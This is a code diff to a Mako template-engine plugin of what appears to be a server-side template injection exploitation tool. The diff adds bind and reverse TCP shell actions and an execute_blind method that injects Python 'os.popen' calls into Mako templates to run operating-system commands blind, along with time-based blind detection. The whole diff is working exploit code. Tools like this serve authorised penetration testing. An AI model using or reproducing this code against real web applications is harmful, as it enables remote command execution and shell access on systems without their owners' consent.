@@ -33,11 +33,19 @@ class Mako(Plugin):
         'blind' : {
             'call': 'evaluate_blind',
             'bool_true' : '"a".join("ab") == "aab"',
-            'bool_false' : 'True == False'
+            'bool_false' : 'False'
         },
         'evaluate_blind' : {
             'call': 'inject',
             'evaluate_blind': """<%% %(code)s and __import__("time").sleep(%(delay)i) %%>"""
+        },
+        'tcp_shell' : {
+            'call' : 'execute_blind',
+            'tcp_shell': languages.bash_tcp_shell
+        },
+        'reverse_tcp_shell' : {
+            'call': 'execute_blind',
+            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
         }
 
     }
@@ -78,7 +86,9 @@ class Mako(Plugin):
         if expected == self.render(payload):
             self.set('language', 'python')
             self.set('engine', 'mako')
-            self.set('evaluate', 'python')
+            self.set('evaluate', 'python')        
+            self.set('execute', True)
+
 
     def detect_eval(self):
 
@@ -94,6 +104,10 @@ class Mako(Plugin):
 
         return self.render("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
 
+    def execute_blind(self, command):
+
+        return self.inject("""<%% import os; os.popen("%s").read() %%>""" % (quote(command)), blind=True)
+
     def detect_blind_engine(self):
 
         if not self.get('blind'):
@@ -102,3 +116,4 @@ class Mako(Plugin):
         self.set('language', 'python')
         self.set('engine', 'mako')
         self.set('evaluate', 'python')
+        self.set('execute', True)
